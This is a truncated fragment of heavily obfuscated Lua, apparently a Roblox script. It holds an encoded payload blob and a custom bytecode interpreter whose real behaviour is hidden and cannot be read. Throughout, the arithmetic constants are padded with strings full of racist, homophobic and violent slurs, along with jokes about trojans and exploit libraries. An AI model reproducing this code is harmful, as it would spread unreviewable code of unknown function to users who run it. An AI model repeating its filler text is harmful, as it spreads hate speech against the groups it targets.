㒘㒞㒜㒢㒘㒤㒙㒢㒥㒡㒝㒡㒞㒠㒣㒟㒡㒞㒠㒞㒠㒗㒛㒦㒘㒥㒜㒤㒠㒚㒜㒚㒜㒙㒠㒘㒠㒤㒞㒣㒗㒢㒛㒗㒤㒞㒝㒝㒘㒜㒜㒛㒠㒟㒤㒠㒤㒟㒝㒠㒙㒞㒙㒞㒚㒚㒣㒜㒥㒛㒝㒡㒤㒣㒠㒢㒠㒡㒤㒡㒘㒗㒜㒥㒡㒥㒦㒥㒜㒟㒤㒝㒘㒛㒤㒛㒘㒚㒜㒞㒙㒟㒢㒟㒛㒞㒠㒜㒡㒜㒢㒛㒛㒚㒡㒘㒜㒣㒜㒢㒘㒡㒜㒠㒠㒣㒦㒦㒗㒤㒠㒥㒙㒡㒛㒣㒡㒢㒞㒡㒟㒞㒠㒙㒦㒘㒜㒗㒠㒦㒤㒜㒟㒛㒝㒛㒝㒚㒙㒚㒛㒘㒡㒘㒞㒘㒗㒦㒝㒢㒛㒥㒘㒥㒘㒤㒜㒣㒜㒙㒜㒛㒚㒚㒘㒙㒜㒘㒠㒟㒗㒝㒠㒜㒝㒛㒤㒛㒣㒛㒟㒘㒘㒢㒤㒡㒤㒡㒘㒠㒜㒤㒠㒤㒥㒥㒚㒤㒠㒜㒤㒜㒝㒛㒘㒚㒜㒙㒠㒜㒦㒟㒗㒝㒠㒞㒙㒚㒚㒜㒗㒛㒞㒙㒣㒙㒙㒣㒙㒡㒜㒠㒠㒟㒤㒟㒚㒡㒞㒝㒠㒜㒤㒜㒘㒛㒝㒚㒠㒙㒤㒙㒘㒙㒞㒘㒤㒦㒤㒦㒘㒥㒜㒦㒡㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒜㒛㒠㒚㒤㒚㒘㒙㒜㒘㒡㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒥㒚㒣㒜㒢㒠㒡㒥㒡㒘㒤㒢㒟㒠㒞㒤㒞㒘㒞㒞㒜㒠㒛㒤㒛㒙㒚㒜㒙㒦㒘㒤㒘㒘㒗㒜㒘㒦㒥㒤㒥㒘㒤㒝㒣㒠㒣㒝㒢㒘㒡㒝㒠㒠㒠㒟㒟㒘㒞㒠㒠㒛㒜㒤㒜㒘㒛㒜㒛㒙㒙㒤㒙㒙㒘㒜㒗㒤㒙㒟㒦㒘㒥㒜㒤㒠㒤㒞㒣㒘㒢㒝㒡㒠㒠㒤㒣㒙㒟㒜㒞㒠㒝㒤㒝㒙㒜㒜㒛㒠㒚㒤㒚㒚㒜㒞㒘㒠㒗㒥㒗㒘㒦㒜㒥㒠㒤㒤㒤㒘㒤㒞㒣㒛㒡㒤㒡㒙㒠㒜㒠㒟㒞㒤㒞㒘㒝㒜㒝㒢㒛㒤㒛㒘㒚㒝㒙㒠㒝㒗㒘㒘㒗㒜㒦㒠㒦㒦㒥㒘㒤㒜㒣㒢㒢㒤㒥㒦㒡㒜㒠㒠㒟㒤㒟㒘㒞㒜㒝㒠㒜㒥㒜㒘㒛㒞㒚㒠㒙㒦㒙㒘㒘㒜㒗㒠㒦㒤㒦㒙㒥㒜㒤㒡㒣㒤㒣㒙㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒝㒥㒝㒘㒜㒜㒛㒠㒚㒦㒚㒘㒙㒜㒘㒠㒘㒗㒗㒠㒦㒜㒥㒠㒤㒤㒛㒘㒣㒠㒢㒠㒡㒤㒡㒘㒦㒞㒗㒙㒦㒘㒤㒝㒘㒤㒝㒜㒛㒤㒛㒘㒚㒜㒠㒤㒟㒞㒟㒠㒝㒟㒚㒦㒛㒗㒙㒚㒙㒜㒘㒜㒚㒛㒘㒙㒦㒥㒞㒘㒟㒤㒟㒘㒞㒜㒝㒠㒜㒤㒜㒘㒚㒜㒞㒟㒠㒤㒙㒜㒘㒜㒗㒠㒦㒤㒜㒛㒛㒤㒚㒡㒚㒦㒚㒘㒢㒢㒡㒠㒠㒤㒠㒘㒦㒟㒥㒤㒤㒦㒣㒡㒣㒚㒢㒗㒟㒠㒚㒛㒙㒜㒘㒠㒗㒤㒞㒛㒝㒡㒛㒢㒞㒘㒤㒘㒣㒜㒢㒠㒡㒤㒗㒤㒠㒜㒟㒠㒞㒤㒞㒘㒝㒜㒜㒠㒢㒤㒟㒘㒜㒝㒙㒠㒘㒤㒘㒘㒘㒞㒚㒛㒥㒤㒥㒛㒤㒜㒣㒢㒢㒤㒢㒘㒡㒜㒠㒠㒠㒢㒟㒘㒞㒟㒝㒠㒝㒗㒜㒘㒛㒝㒚㒠㒚㒚㒜㒡㒘㒜㒗㒣㒦㒤㒦㒟㒥㒜㒤㒡㒣㒤㒣㒘㒢㒜㒡㒤㒣㒟㒠㒘㒟㒜㒞㒠㒞㒛㒝㒘㒜㒝㒛㒠㒛㒦㒝㒣㒙㒜㒘㒣㒗㒤㒗㒚㒦㒜㒥㒠㒤㒤㒤㒘㒤㒚㒢㒠㒢㒗㒡㒘㒠㒟㒟㒠㒞㒥㒞㒘㒝㒜㒞㒗㒛㒤㒛㒛㒚㒜㒙㒢㒘㒤㒘㒘㒗㒜㒗㒢㒘㒝㒥㒘㒤㒟㒣㒠㒣㒗㒢㒘㒡㒜㒠㒠㒠㒦㒠㒥㒞㒜㒝㒤㒜㒤㒜㒟㒛㒜㒚㒠㒙㒤㒚㒚㒘㒜㒗㒠㒗㒙㒦㒘㒥㒟㒤㒠㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒞㒟㒜㒞㒠㒝㒤㒝㒘㒜㒜㒜㒢㒚㒤㒚㒘㒙㒣㒘㒠㒘㒗㒗㒘㒦㒜㒥㒠㒥㒘㒤㒘㒣㒜㒢㒥㒡㒤㒢㒥㒠㒜㒟㒡㒞㒤㒞㒘㒠㒘㒜㒠㒜㒝㒛㒘㒚㒠㒙㒠㒘㒤㒘㒘㒘㒞㒙㒦㒥㒤㒥㒢㒤㒜㒣㒥㒢㒤㒢㒘㒡㒜㒢㒠㒟㒤㒟㒘㒞㒦㒝㒠㒝㒞㒜㒘㒛㒠㒚㒠㒛㒤㒙㒘㒘㒜㒘㒛㒦㒤㒦㒘㒥㒜㒤㒦㒣㒤㒣㒘㒢㒜㒡㒠㒡㒡㒠㒘㒟㒤㒞㒠㒝㒤㒝㒘㒜㒜㒛㒠㒚㒤㒚㒦㒙㒜㒙㒘㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒘㒤㒗㒢㒠㒢㒢㒡㒘㒠㒞㒟㒠㒠㒤㒞㒘㒝㒜㒝㒛㒛㒤㒛㒣㒚㒜㒙㒡㒘㒤㒘㒘㒗㒜㒦㒠㒦㒟㒥㒘㒤㒞㒣㒠㒢㒦㒢㒘㒡㒜㒠㒠㒟㒤㒟㒣㒞㒜㒞㒛㒜㒤㒜㒛㒛㒜㒜㒠㒙㒤㒙㒘㒙㒗㒗㒠㒗㒟㒦㒘㒥㒤㒤㒠㒣㒤㒣㒘㒢㒜㒢㒚㒠㒤㒠㒚㒟㒜㒞㒢㒝㒤㒝㒘㒜㒜㒛㒠㒛㒘㒚㒘㒙㒥㒘㒠㒘㒞㒗㒘㒦㒜㒥㒠㒤㒤㒤㒡㒣㒜㒢㒣㒡㒤㒡㒚㒠㒜㒡㒠㒞㒤㒞㒘㒝㒟㒜㒠㒜㒝㒛㒘㒚㒤㒙㒠㒙㒘㒚㒦㒗㒜㒦㒥㒥㒤㒥㒥㒤㒜㒣㒡㒢㒤㒣㒚㒥㒗㒠㒠㒠㒙㒟㒘㒞㒞㒝㒠㒜㒤㒜㒘㒛㒜㒜㒙㒙㒤㒙㒝㒘㒜㒗㒡㒦㒤㒦㒜㒥㒜㒤㒠㒥㒛㒣㒘㒢㒠㒡㒠㒠㒦㒠㒘㒟㒜㒞㒠㒝㒤㒠㒙㒜㒜㒛㒠㒚㒤㒚㒙㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒚㒣㒞㒢㒠㒡㒤㒡㒘㒛㒠㒟㒠㒞㒤㒞㒘㒝㒜㒜㒠㒛㒤㒛㒘㒚㒜㒞㒜㒙㒙㒘㒘㒗㒜㒦㒠㒜㒤㒛㒛㒚㒝㒚㒜㒙㒠㒣㒦㒡㒜㒠㒠㒟㒤㒠㒚㒠㒥㒝㒠㒜㒦㒜㒘㒛㒝㒚㒠㒙㒤㒙㒘㒙㒞㒚㒙㒦㒤㒦㒛㒥㒜㒤㒡㒣㒤㒣㒘㒢㒜㒢㒢㒤㒟㒠㒘㒟㒠㒞㒠㒝㒦㒝㒘㒜㒜㒛㒠㒛㒚㒛㒣㒙㒜㒘㒥㒗㒤㒗㒘㒦㒜㒥㒡㒤㒤㒤㒜㒣㒜㒢㒠㒤㒛㒡㒘㒠㒜㒟㒠㒞㒦㒞㒘㒝㒜㒜㒠㒛㒤㒝㒟㒚㒜㒙㒠㒘㒤㒘㒘㒗㒜㒦㒠㒥㒤㒥㒘㒦㒣㒣㒠㒢㒤㒢㒘㒡㒟㒠㒠㒟㒤㒟㒘㒞㒜㒠㒗㒜㒤㒜㒘㒛㒜㒚㒡㒙㒤㒙㒘㒘㒜㒗㒠㒚㒢㒦㒘㒥㒠㒤㒠㒣㒦㒣㒘㒢㒝㒡㒠㒡㒚㒤㒜㒟㒜㒞㒠㒝㒤㒝㒤㒜㒜㒛㒡㒚㒤㒚㒙㒙㒜㒘㒤㒚㒟㒗㒘㒦㒜㒥㒠㒥㒠㒤㒘㒣㒝㒢㒠㒢㒘㒣㒣㒠㒜㒟㒠㒞㒤㒟㒢㒝㒜㒜㒡㒛㒤㒛㒞㒜㒝㒙㒠㒘㒤㒘㒘㒘㒦㒦㒠㒥㒥㒥㒘㒤㒝㒣㒠㒣㒘㒤㒣㒡㒜㒠㒠㒟㒤㒠㒢㒞㒜㒝㒡㒜㒤㒜㒞㒟㒠㒚㒠㒙㒥㒙㒘㒙㒝㒗㒠㒦㒥㒦㒘㒥㒜㒤㒠㒤㒘㒥㒣㒢㒜㒡㒠㒠㒤㒡㒙㒟㒜㒞㒡㒝㒤㒝㒜㒟㒗㒛㒠㒚㒤㒚㒘㒚㒦㒘㒠㒗㒥㒗㒘㒦㒜㒘㒝㒤㒤㒤㒜㒣㒜㒢㒢㒡㒤㒡㒛㒠㒜㒟㒠㒡㒡㒞㒘㒝㒡㒜㒠㒜㒗㒛㒘㒚㒞㒙㒠㒙㒚㒜㒜㒗㒜㒦㒤㒥㒤㒦㒞㒤㒜㒣㒡㒢㒤㒢㒝㒡㒜㒠㒤㒢㒟㒟㒘㒞㒜㒝㒠㒞㒚㒜㒘㒛㒝㒚㒠㒚㒘㒛㒣㒘㒜㒗㒠㒦㒤㒗㒢㒥㒜㒤㒡㒣㒤㒣㒘㒥㒙㒡㒠㒡㒘㒠㒘㒟㒞㒞㒠㒞㒗㒝㒘㒜㒜㒞㒝㒚㒤㒚㒝㒙㒜㒘㒣㒗㒤㒗㒚㒦㒜㒥㒦㒙㒘㒤㒘㒣㒠㒢㒠㒣㒟㒡㒘㒠㒝㒟㒠㒟㒙㒞㒘㒝㒠㒟㒛㒛㒤㒛㒘㒚㒜㒛㒛㒘㒤㒘㒙㒗㒜㒦㒠㒗㒜㒥㒘㒤㒠㒣㒠㒢㒤㒢㒘㒡㒜㒠㒠㒟㒤㒡㒝㒞㒜㒝㒤㒜㒤㒜㒙㒛㒜㒚㒠㒙㒤㒙㒘㒙㒣㒗㒠㒗㒘㒦㒘㒥㒞㒤㒠㒣㒤㒣㒘㒢㒜㒤㒡㒠㒤㒠㒘㒟㒜㒞㒡㒝㒤㒝㒘㒜㒜㒛㒡㒚㒤㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒥㒛㒤㒘㒣㒜㒢㒠㒡㒤㒡㒥㒠㒜㒟㒠㒞㒤㒞㒙㒝㒜㒜㒠㒛㒤㒛㒘㒚㒜㒙㒠㒘㒤㒘㒘㒗㒜㒦㒠㒥㒤㒥㒘㒤㒜㒣㒠㒢㒤㒢㒘㒡㒜㒠㒠㒟㒤㒟㒘㒞㒜㒝㒠㒜㒤㒜㒘㒛㒜㒚㒠㒚㒗㒙㒘㒘㒜㒗㒠㒦㒤㒦㒘㒥㒜㒤㒠㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒞㒛㒠㒚㒤㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒡㒤㒤㒤㒘㒣㒜㒢㒠㒡㒤㒡㒘㒠㒜");local O=(-#{26,'}';1}+15)local n=3 local l=a;local o={}o={[(-#[[yiff]]+(-49+0x36))]=function()local r,a,o,e=y(I,l,l+M);l=l+P;n=(n+(O*P))%t;return(((e+n-(O)+d*(P*i))%d)*((i*z)^i))+(((o+n-(O*i)+d*(i^M))%t)*(d*t))+(((a+n-(O*M)+z)%t)*d)+((r+n-(O*P)+z)%t);end,[(64-0x3e)]=function(e,e,e)local e=y(I,l,l);l=l+r;n=(n+(O))%t;return((e+n-(O)+z)%d);end,[((0x390/76)+-#"kys nigga")]=function()local e,o=y(I,l,l+i);n=(n+(O*i))%t;l=l+i;return(((o+n-(O)+d*(i*P))%d)*t)+((e+n-(O*i)+t*(i^M))%d);end,[(67+(54+-0x75))]=function(o,e,n)if n then local e=(o/i^(e-a))%i^((n-r)-(e-a)+r);return e-e%a;else local e=i^(e-r);return(o%(e+e)>=e)and a or S;end;end,[(0xaa/(-20+0x36))]=function()local n=o[(63-0x3e)]();local e=o[(0x7e+-125)]();local c=a;local l=(o[(((0x6680/160)+-0x5f)+-#[[How to give a motherfuckin audience a feeling like its levitating]])](e,r,B+P)*(i^(B*i)))+n;local n=o[(0x4e-74)](e,21,31);local e=((-a)^o[(0x35-49)](e,32));if(n==S)then if(l==C)then return e*S;else n=r;c=C;end;elseif(n==(d*(i^M))-r)then return(l==S)and(e*(r/C))or(e*(S/C));end;return H(e,n-((t*(P))-a))*(c+(l/(i^Y)));end,[((0x61+-73)+-#[[furries should die]])]=function(e,i,i)local i;if(not e)then e=o[(176/0xb0)]();if(e==S)then return'';end;end;i=K(I,l,l+e-a);l=l+e;local e=''for o=r,#i do e=L(e,A((y(K(i,o,o))+n)%t))n=(n+O)%d end return e;end}local function I(...)return{...},W('#',...)end local function z()local x={};local h={};local e={};local u={x,h,nil,e};local n={}local k=(157-0x68)local e={[(-30+(198/0x6))]=(function(e)return not(#e==o[(-#"I FUCKING HATE FEMBOYS"+(4776/0xc7))]())end),[(114-0x72)]=(function(e)return o[((0x2c16/171)+-#"Well thats what they do when they get jealous they confuse it")]()end),[(0x1a-22)]=(function(e)return o[(133-(-0x33+178))]()end),[(0x56-85)]=(function(e)local n=o[(0x12/3)]()local e=''local o=1 for l=1,#n do o=(o+k)%t e=L(e,A((y(n:sub(l,l))+o)%d))end return e end)};u[3]=o[((0x124f/109)+-#"nate higger nuck figgers and nill kiggers")]();local l=o[(-#'jjsplot on top'+(45/0x3))]()for l=1,l do local o=o[(0x68+((-0x1b77/89)+-#[[dot gg slash BKf6SjpfFv]]))]();local d;local e=e[o%((-122+0xb2)+-#'loading trojan horse')];n[l]=e and e({});end;for d=1,o[(-0x31+50)]()do local e=o[(-#[[impulse loves moonsex]]+(117-0x5e))]();if(o[((-73+0xb6)+-#'local ballsack equals game dot players dot local player dot character dot humanoid dot torso dot ballsack')](e,a,r)==C)then local t=o[(-#"I like watching videos of black men shaking their booty cheeks"+(0xab-105))](e,i,M);local l=o[(0x61-93)](e,P,i+P);local e={o[(95-0x5c)](),o[(0x117/93)](),nil,nil};local h={[(0x0/103)]=function()e[f]=o[(-#[[subemelaradjo]]+(112/0x7))]();e[D]=o[(0x27-36)]();end,[(0x4b+-74)]=function()e[c]=o[(0x6f+-110)]();end,[(31-(3016/0x68))]=function()e[w]=o[(0x3d-60)]()-(i^B)end,[(480/0xa0)]=function()e[m]=o[(-#'nigga porn 360'+(0x40-49))]()-(i^B)e[_]=o[(-#'my name jeff'+(0x3c-45))]();end};h[t]();if(o[(0x180/96)](l,r,a)==r)then e[s]=n[e[b]]end if(o[((-58+0x6d)+-#[[Hoo gah hooga hoo gahoo hoo gah hooga hoo gahoo]])](l,i,i)==a)then e[w]=n[e[c]]end if(o[((0x81-(0x87+-25))+-#"Russian letters")](l,M,M)==r)then e[p]=n[e[D]]end x[d]=e;end end;for e=r,o[(-0x23+36)]()do h[e-r]=z();end;return u;end;local function S(o,P,O)local l=o[i];local n=o[M];local d=o[a];return(function(...)local o=n;local y={};local n=I local n=a n*=-1 local n=n;local C={};local n={};local t=d;local M=l;local d=W('#',...)-r;local B={...};local l=a;for e=0,d do if(e>=o)then y[e-o]=B[e+r];else n[e]=B[e+a];end;end;local o=d-o+a local o;local d;while true do o=t[l];d=o[((0x8a-124)+-#"ur mom is hot")];e=(318923)while(-35+(154+-0x55))>=d do e-= e e=(3788640)while d<=(-0x7d+141)do e-= e e=(6182450)while d<=(133-0x7e)do e-= e e=(860808)while d<=(-#[[iPipeh Is My god]]+(0x8e-123))do e-= e e=(2755752)while(-#"Axeo of the worst boronide forks Includes nocredito dumpedito nigedito"+(153+-0x52))>=d do e-= e e=(6569700)while d>((-87+0x65)+-#[[sexo 4 o filme]])do e-= e local e=o[u];local a=n[e+2];local d=n[e]+a;n[e]=d;if(a>0)then if(d<=n[e+1])then l=o[U];n[e+3]=d;end elseif(d>=n[e+1])then l=o[m];n[e+3]=d;end break end while(e)/(((792936/0xd8)+-#[[panzerfaust]]))==1795 do P[o[w]]=n[o[g]];break end;break;end while 1154==(e)/((262680/0x6e))do e=(112307)while(68-0x42)<d do e-= e n[o[s]][n[o[f]]]=n[o[v]];break end while(e)/((-#'Cause I know the way to get em motivated'+(0x1144-2261)))==53 do n[o[g]]={};break end;break;end break;end while(e)/((0x9204/105))==2418 do e=(3646214)while(0x34-47)>=d do e-= e e=(7391232)while d>((4810/0xb9)+-#[[nononono listen listen]])do e-= e l=o[m];break end while(e)/((4217-0x879))==3609 do do return end;break end;break;end while(e)/((0x1f7da/41))==1159 do e=(2985510)while(0x4f8/212)<d do e-= e local l=o[U];local e=n[l]for o=l+1,o[v]do e=e..n[o];end;n[o[u]]=e;break end while(e)/((4886-((-0x44+2610)+-#[[What I gotta do to get it through to you Im superhuman]])))==1245 do n[o[u]]=o[f];break end;break;end break;end break;end while 2333==(e)/((0x14cd-2675))do e=(1016688)while(61+-0x32)>=d do e-= e e=(11179056)while d<=((161-0x69)+-#[[Please stop hitting my ribcage with a metal bar]])do e-= e e=(315370)while d>((0x15d6/215)+-#"free bobux no skem")do e-= e local e=o[k]n[e]=n[e](q(n,e+a,o[w]))break end while(e)/((-#[[Tomathoust6969 was here]]+((2184-0x478)-0x223)))==671 do do return n[o[s]]end break end;break;end while 4074==(e)/(((634340/0xe6)+-#'jjsplot on top'))do e=(3454032)while(43-0x21)<d do e-= e local e;O[o[h]]=n[o[u]];l=l+a;o=t[l];n[o[u]]=O[o[c]];l=l+a;o=t[l];n[o[x]]=o[h];l=l+a;o=t[l];e=o[b]n[e]=n[e](n[e+r])l=l+a;o=t[l];n[o[x]]();l=l+a;o=t[l];do return end;break end while(e)/((-#"Eu gosto de peitos"+(1368+-0x52)))==2724 do if(n[o[k]]==o[N])then l=l+r;else l=o[m];end;break end;break;end break;end while 354==(e)/((0x5ea88/135))do e=(3065976)while(1339/0x67)>=d do e-= e e=(6079040)while(0x66+-90)<d do e-= e n[o[k]]=P[o[c]];l=l+a;o=t[l];n[o[k]]=#n[o[U]];l=l+a;o=t[l];P[o[w]]=n[o[u]];l=l+a;o=t[l];n[o[s]]=P[o[h]];l=l+a;o=t[l];n[o[x]]=#n[o[U]];l=l+a;o=t[l];P[o[f]]=n[o[x]];l=l+a;o=t[l];do return end;break end while 3454==(e)/((-#'while wait 1 do print deez end'+(313250/(-0x40+239))))do local e=o[g]n[e]=n[e](n[e+r])break end;break;end while(e)/(((-51+0x3ba)+-#'cilerteddoesntlikeburgers'))==3492 do e=(3422926)while d<=(-46+0x3c)do e-= e n[o[g]]=n[o[h]][n[o[p]]];break;end while 1066==(e)/((0x677ac/132))do e=(9878912)while d>((0x34c7/229)+-#"MoonsecV2 deobfuscator 2020 free 100 percent")do e-= e n[o[s]]=#n[o[m]];break end while(e)/((0xe6d+-77))==2732 do n[o[u]]=P[o[U]];break end;break;end break;end break;end break;end break;end while(e)/((5388-0xac5))==1440 do e=(2500086)while(-104+0x81)>=d do e-= e e=(855545)while(97-0x4d)>=d do e-= e e=(999354)while(-0x1d+47)>=d do e-= e e=(178752)while(-#"KFC and watermelon"+(0x4ec/36))<d do e-= e n[o[x]]=n[o[h]][n[o[_]]];break end while(e)/((0xb1e+-53))==64 do n[o[b]]=n[o[h]]%o[D];break end;break;end while(e)/((0x503-704))==1726 do e=(5604780)while d>((11194/0xc1)+-#[[papier ist ein kleiner schwanz lutscher]])do e-= e O[o[h]]=n[o[g]];l=l+a;o=t[l];n[o[u]]={};l=l+a;o=t[l];n[o[g]]={};l=l+a;o=t[l];O[o[U]]=n[o[s]];l=l+a;o=t[l];n[o[x]]=O[o[m]];l=l+a;o=t[l];if(n[o[u]]==o[D])then l=l+r;else l=o[c];end;break end while 1635==(e)/((3530+-0x66))do n[o[g]]=S(M[o[c]],nil,O);break end;break;end break;end while 695==(e)/((0x517+-72))do e=(10752480)while d<=(138+-0x74)do e-= e e=(2561400)while(-#[[how to use visual studio jk jk dont take it seriously what 6 hours per messange]]+(0x3390/132))<d do e-= e n[o[b]]=O[o[f]];break end while 1800==(e)/(((2976-0x5e7)+-#'Reduce meme string slowmode when plsplspls'))do P[o[h]]=n[o[x]];break end;break;end while(e)/((-#"Sou usuário de HProtect"+(-0x73+(0x1c01-3611))))==3144 do e=(5340880)while d<=(-#'no dick no balls'+((-#'thats not nice'+(0x5b83/171))+-0x54))do e-= e do return n[o[b]]end break;end while 1322==(e)/((-#"nicuse is nil skull"+(0x5b2b4/92)))do e=(8858875)while((0x2f6a/238)+-#"goofy ahh uncle productions")<d do e-= e n[o[g]][n[o[w]]]=n[o[p]];break end while(e)/((0x19c17/39))==3275 do n[o[x]]=(o[c]~=0);l=l+r;break end;break;end break;end break;end break;end while(e)/((852+-0x2d))==3098 do e=(1306806)while d<=(0x601/53)do e-= e e=(949000)while d<=((7832/0x58)+-#'i finally have my time travelling vehicle to locate moonsex v5')do e-= e e=(186225)while d>(-0x4c+102)do e-= e local a=M[o[c]];local d;local e={};d=F({},{__index=function(n,o)local e=e[o];return e[1][e[2]];end,__newindex=function(l,o,n)local e=e[o]e[1][e[2]]=n;end;});for d=1,o[_]do l=l+r;local o=t[l];if o[(-0x36+55)]==39 then e[d-1]={n,o[U]};else e[d-1]={P,o[c]};end;C[#C+1]=e;end;n[o[k]]=S(a,d,O);break end while 573==(e)/((748-0x1a7))do n[o[k]]=n[o[c]]-n[o[N]];break end;break;end while(e)/((0x238c/28))==2920 do e=(6532526)while d>(0x72-86)do e-= e local r;local d;local e;n[o[b]]=o[f];l=l+a;o=t[l];n[o[s]]=o[c];l=l+a;o=t[l];n[o[x]]=#n[o[h]];l=l+a;o=t[l];n[o[b]]=o[f];l=l+a;o=t[l];e=o[b];d=n[e]r=n[e+2];if(r>0)then if(d>n[e+1])then l=o[U];else n[e+3]=d;end elseif(d<n[e+1])then l=o[f];else n[e+3]=d;end break end while 1757==(e)/(((0xf35+-113)+-#"if syn then syn dot request get beliveri12 coma nicuse ass end"))do if(n[o[x]]~=n[o[D]])then l=l+r;else l=o[f];end;break end;break;end break;end while(e)/((-0x53+436))==3702 do e=(11950173)while d<=(0x51-50)do e-= e e=(4082208)while(48+-0x12)<d do e-= e local e=o[x];local d=n[e]local a=n[e+2];if(a>0)then if(d>n[e+1])then l=o[w];else n[e+3]=d;end elseif(d<n[e+1])then l=o[w];else n[e+3]=d;end break end while 3271==(e)/((2516-(-#"Alma Alma"+(-69+0x542))))do if n[o[b]]then l=l+a;else l=o[w];end;break end;break;end while 3139==(e)/(((3932+-0x34)+-#"local bolsac equals game dot localplayer dot character dot legs dot bolls"))do e=(182512)while(0x5c+-60)>=d do e-= e n[o[u]]=n[o[h]]%o[N];break;end while 176==(e)/((7259/0x7))do e=(228344)while(0x6b+-74)<d do e-= e local e={n,o};e[r][e[i][x]]=e[a][e[i][_]]+e[r][e[i][U]];break end while(e)/((-0x2e+3174))==73 do if(n[o[k]]==n[o[_]])then l=l+r;else l=o[w];end;break end;break;end break;end break;end break;end break;end break;end while 367==(e)/((0x72a-965))do e=(4894260)while d<=(122-0x46)do e-= e e=(7866300)while(-18+0x3d)>=d do e-= e e=(5139056)while((((0x55+-110)+-#"me when they are is have the me when are is do me when")+161)+-#"MoonsecV2 deobfuscator 2020 free 100 percent")>=d do e-= e e=(5003658)while((3220/0x23)+-#'You say is ricochetin off of me and itll glue to you and')>=d do e-= e e=(1690120)while d>(-#[[i love tatakai]]+(0x1a6a/138))do e-= e n[o[s]]=(o[U]~=0);l=l+r;break end while(e)/((0x17a05/71))==1240 do n[o[s]]=n[o[U]][o[p]];break end;break;end while 1366==(e)/(((-#"If LocalPlayer equals Dumbass then while true do end"+(15023-0x1d8b))-3745))do e=(6515634)while(((463+-0x42)-0x106)+-#'People trying to play roblox colon meanwhile crosswoods colon may I introduce myself question mark')<d do e-= e n[o[s]]();break end while 1959==(e)/((0x1a35-3383))do n[o[x]]=(o[h]~=0);break end;break;end break;end while 1612==(e)/((6438-0xcb2))do e=(1333306)while d<=(0xa3-123)do e-= e e=(1017146)while d>(-#[[atakan der nigga]]+(0x1cca/134))do e-= e n[o[u]]=#n[o[h]];break end while 1102==(e)/((1903-0x3d4))do n[o[b]]=n[o[U]];break end;break;end while 494==(e)/((0x1a5b8/40))do e=(1399743)while d<=((0x2b65/161)+-#'With rock shock rap with Doc')do e-= e n[o[u]]=o[f];break;end while 2697==(e)/((0x457-592))do e=(2119842)while(0x9ae/59)<d do e-= e l=o[m];break end while(e)/((0x200c-4143))==522 do n[o[k]]=(o[c]~=0);break end;break;end break;end break;end break;end while(e)/((0x3de3c/130))==4034 do e=(12011392)while d<=((-75+0x93)+-#[[cilerteddoesntlikeburgers]])do e-= e e=(3240171)while((0x4fb/17)+-#'while wait 1 do print deez end')>=d do e-= e e=(7995416)while d>(-0x5e+138)do e-= e n[o[s]]=n[o[w]]-n[o[_]];break end while(e)/((6110-0xc16))==2651 do n[o[s]]=n[o[h]];break end;break;end while(e)/((398475/0xaf))==1423 do e=(329004)while d>(0xad-127)do e-= e if(n[o[k]]==o[j])then l=l+r;else l=o[h];end;break end while 2812==(e)/((233+-0x74))do local e=o[x];local a=n[e+2];local d=n[e]+a;n[e]=d;if(a>0)then if(d<=n[e+1])then l=o[h];n[e+3]=d;end elseif(d>=n[e+1])then l=o[m];n[e+3]=d;end break end;break;end break;end while(e)/((0x1b20-3520))==3508 do e=(493493)while d<=(115+(-0x41+-1))do e-= e e=(14609063)while d>(528/0xb)do e-= e do return end;break end while(e)/(((8206-0x1037)+-#"Shrimps was here"))==3617 do if(n[o[x]]==n[o[v]])then l=l+r;else l=o[c];end;break end;break;end while 1309==(e)/((494+-0x75))do e=(11279499)while((0xfb-139)+-#[[if syn then syn dot request get beliveri12 coma nicuse ass end]])>=d do e-= e n[o[x]]=S(M[o[c]],nil,O);break;end while 4053==(e)/((314479/0x71))do e=(549582)while d>(10965/0xd7)do e-= e local l=o[x];local e=n[o[w]];n[l+1]=e;n[l]=e[o[N]];break end while(e)/((0x2d76e/82))==242 do local l=o[h];local e=n[l]for o=l+1,o[j]do e=e..n[o];end;n[o[s]]=e;break end;break;end break;end break;end break;end break;end while 3794==(e)/((-#'how to obfuscate plssss help'+(332136/0xfc)))do e=(4735614)while d<=(-#'rule 2 ok'+((20120-0x277e)/0x8f))do e-= e e=(701577)while((315-0xc4)+-63)>=d do e-= e e=(7360752)while((0x2f1b-6065)/111)>=d do e-= e e=(2202158)while d>(-#'impulse loves moonsex'+(-26+((0x14f-194)+-#[[nate higger nuck figgers and nill kiggers]])))do e-= e local P;local d;local U;local e;n[o[s]]=O[o[c]];l=l+a;o=t[l];n[o[x]]=n[o[m]][o[v]];l=l+a;o=t[l];e=o[b];U=n[o[w]];n[e+1]=U;n[e]=U[o[p]];l=l+a;o=t[l];n[o[b]]=n[o[h]];l=l+a;o=t[l];n[o[u]]=n[o[f]];l=l+a;o=t[l];e=o[k]n[e]=n[e](q(n,e+a,o[c]))l=l+a;o=t[l];e=o[s];U=n[o[f]];n[e+1]=U;n[e]=U[o[j]];l=l+a;o=t[l];e=o[b]n[e]=n[e](n[e+r])l=l+a;o=t[l];d={n,o};d[r][d[i][b]]=d[a][d[i][_]]+d[r][d[i][c]];l=l+a;o=t[l];n[o[u]]=n[o[c]]%o[D];l=l+a;o=t[l];e=o[s]n[e]=n[e](n[e+r])l=l+a;o=t[l];U=o[f];P=n[U]for e=U+1,o[j]do P=P..n[e];end;n[o[u]]=P;l=l+a;o=t[l];d={n,o};d[r][d[i][g]]=d[a][d[i][_]]+d[r][d[i][h]];l=l+a;o=t[l];n[o[g]]=n[o[h]]%o[v];break end while(e)/((-#[[Pyrite On Top]]+(-0x7c+2391)))==977 do local e=o[k]n[e]=n[e](n[e+r])break end;break;end while 3459==(e)/((-54+0x886))do e=(1652490)while(169-0x72)<d do e-= e local a=M[o[c]];local d;local e={};d=F({},{__index=function(n,o)local e=e[o];return e[1][e[2]];end,__newindex=function(l,o,n)local e=e[o]e[1][e[2]]=n;end;});for d=1,o[D]do l=l+r;local o=t[l];if o[(0xd1/209)]==39 then 